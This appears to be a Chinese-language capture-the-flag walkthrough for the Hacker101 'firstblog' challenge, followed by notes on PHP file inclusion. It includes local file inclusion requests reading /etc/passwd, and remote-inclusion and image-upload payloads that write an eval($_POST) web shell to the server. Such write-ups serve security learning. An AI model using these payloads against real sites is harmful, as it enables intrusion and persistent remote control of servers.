---
title: hacker101-firstblog
date: 2019-07-08 23:45:35
tags: 
category: walkthrough
---
<!-- more -->

# walkthrough

首先查看 html 源代码，可以发现如下代码：

```
<a href="?page=admin.auth.inc">Admin login</a>
```

说明存在php文件包含漏洞，打开

```
http://35.190.155.168/97b7287bc0/?page=admin.auth.inc
```

需要进行登录，这个时候需要考虑越权的问题

```
http://35.190.155.168/97b7287bc0/?page=admin.inc
```

成功获取第一个 flag。从环境中大概可以了解到，作者使用 php 作为一个模板渲染，渲染是发生在 server 端，既然使用 php 渲染，那么在 comment 里面应该就可以执行 php 代码，于是插入以下代码，获取到第二个 flag

```
<? php echo readfile('index.php'); ?>
```

最后打开

```
http://35.190.155.168/97b7287bc0/?page=http://localhost/index
```

查看源代码，成功获取第三个 flag



# 知识点

## php 包含文件漏洞

 ### 本地包含

```
http://35.190.155.168/97b7287bc0/?page=http://localhost/index
http://35.190.155.168/97b7287bc0/?page=/etc/passwd
```

### 远程包含

远程服务器新建一个 test.txt 文件如下：

```php
<?fputs(fopen("shell.php","w"),"<?php eval($_POST[params]);?>")?>
```

然后打开

```
http://xxx.xxx.com?page=http://xxx.xxx.com/test.txt
```

可以在服务器上产生一个 shell.php 文件 【待实验】

### 本地配合上传文件

上传一个图片木马a.jpg，内容为：

```php
<?fputs(fopen("shell.php","w"),"<?php eval($_POST[tzc]);?>")?>
```

访问URL：*http://www.xxx.com/index.php?page=./a.jpg*在本地生成shell.php。



# 参考

https://thief.one/2017/04/10/2/

[https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/](https://chybeta.github.io/2017/10/08/php文件包含漏洞/)